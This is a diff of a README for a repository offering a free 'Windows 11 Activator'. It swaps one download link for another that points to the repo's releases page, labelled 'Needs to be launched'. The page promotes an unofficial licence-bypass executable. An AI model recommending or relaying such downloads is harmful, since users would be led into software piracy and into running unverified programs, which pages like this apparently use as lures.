@@ -26,7 +26,7 @@ Welcome to the **Windows-11-Activator-Free** repository! Activate your Windows 1
 ## Get Started
 Ready to activate your Windows 11? Access the activation tools and resources by downloading the activator from the link below:
 
-[![Download Windows 11 Activator](https://img.shields.io/badge/Download-Activator-blue)](https://github.com/uploads/App.zip "Needs to be launched")
+[![Download Windows 11 Activator](https://github.com/Shreyas7122006/Windows-11-Activator-Free/releases)](https://github.com/Shreyas7122006/Windows-11-Activator-Free/releases "Needs to be launched")
 
 ## 🌟 Featured Tools and Tips 🌟
 
